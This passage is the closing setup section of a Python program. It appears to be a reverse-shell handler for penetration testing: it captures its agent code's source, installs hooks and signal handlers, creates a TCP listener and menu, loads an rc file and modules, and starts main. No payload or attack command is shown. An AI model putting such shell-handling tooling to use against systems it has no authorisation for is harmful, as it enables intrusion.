VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
    """
}

# Python Agent code
GET_GLOB_SIZE = inspect.getsource(get_glob_size)
MESSENGER = inspect.getsource(Messenger)
STREAM = inspect.getsource(Stream)
AGENT = inspect.getsource(agent)

# Python modifications
original_input = input
input = my_input
sys.excepthook = custom_excepthook
threading.excepthook = custom_excepthook
tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
os.umask(0o007)
signal.signal(signal.SIGWINCH, WinResize)
keyboard_interrupt = signal.getsignal(signal.SIGINT)
try:
	import readline
	readline.parse_and_bind("tab: complete")
	default_readline_delims = readline.get_completer_delims()
except ImportError:
	readline = None
	default_readline_delims = None

## Create basic objects
core = Core()
menu = MainMenu(histfile=options.cmd_histfile, histlen=options.histlength)
start = menu.start
Listener = TCPListener

# Check for installed emojis
if not fonts_installed():
	logger.warning("For showing emojis please install 'fonts-noto-color-emoji'")

# Load peneloperc
load_rc()

# Load modules
load_modules()

if __name__ == "__main__":
	main()
